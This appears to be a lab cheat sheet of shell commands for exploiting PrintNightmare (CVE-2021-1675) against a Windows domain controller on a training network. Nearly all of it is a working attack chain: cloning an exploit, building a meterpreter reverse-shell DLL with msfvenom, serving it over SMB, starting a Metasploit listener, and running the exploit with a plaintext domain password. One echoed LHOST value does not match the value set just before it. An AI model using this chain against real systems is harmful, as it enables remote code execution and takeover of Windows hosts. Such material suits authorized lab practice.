PrintNightmare Exploit Source (Needs custom impacket version) (attack host)
```shell-session
git clone https://github.com/cube0x0/CVE-2021-1675.git
```

Custom Version of impacket for PrintNightmare (attack host)
```shell-session
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

Check for needed protocols for printnightmare (attack host)
```shell-session
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
```

Creating dll payload(attack host)
```shell-session
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
```

Create SMB Share (attack host)
```shell-session
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
```

Establish rev shell with MSF (attack host)
```shell-session
[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 172.16.5.225
LHOST => 10.3.88.114
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 8080
LPORT => 8080
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run

[*] Started reverse TCP handler on 172.16.5.225:8080 
```

Run exploit (attack host)
```shell-session
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
```
